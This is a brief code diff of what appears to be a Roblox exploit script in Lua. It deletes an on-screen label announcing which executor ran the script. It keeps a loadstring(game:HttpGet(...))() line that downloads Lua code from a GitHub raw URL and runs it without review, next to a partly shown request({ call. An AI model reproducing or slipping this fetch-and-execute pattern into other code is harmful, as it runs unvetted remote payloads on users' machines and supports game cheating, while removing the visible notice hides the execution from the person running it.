@@ -40,18 +40,6 @@ request({
 })
 
 
-local gui = Instance.new("ScreenGui")
-gui.Parent = player:WaitForChild("PlayerGui")
-
-local label = Instance.new("TextLabel")
-label.Parent = gui
-label.Size = UDim2.new(0, 200, 0, 50)
-label.Position = UDim2.new(0.5, -100, 0.5, -25) 
-label.Text = "Script exécuté sur " .. exploit
-label.TextColor3 = Color3.fromRGB(255, 255, 255)
-label.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-label.TextScaled = true
-
 local success, result = pcall(function()
     return loadstring(game:HttpGet("https://raw.githubusercontent.com/azenbest/test/refs/heads/main/main.lua"))()
 end)
